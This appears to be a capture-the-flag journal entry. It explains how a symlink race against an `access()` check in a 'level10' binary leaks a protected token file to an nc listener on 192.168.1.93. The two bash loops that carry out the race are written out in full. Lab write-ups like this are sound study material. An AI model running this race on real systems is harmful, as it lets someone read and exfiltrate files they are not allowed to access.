Date: 9/21/2024

Entry:
In this challenge we had to exploit the `access()` function in order to send files not owned by us to the server.
In order to finish this exercise, we did the following steps:
1. `nc -lk 6969'—we o open a server listening on port 6969.
2. We wrote a script with an infinite while loop to constantly create and remove symbolic links to our `token`.
    ```#!/bin/bash

    while true; do
        touch /tmp/xyz
        rm /tmp/xyz
        ln -s /home/user/level10/token /tmp/xyz
        rm /tmp/xyz
    done```
3. We wrote a script with an infinite while loop to constantly execute program `level10` with the symbolic link created in the previous script.
    ```
    #!/bin/bash

    while true; do
        ./level10 /tmp/xyz 192.168.1.93
    done
    ```
4. By executing both scripts at the same time and checking the input on our server, the password for user `flag10` appeared, and then we just had to log in and execute the `getflag` command.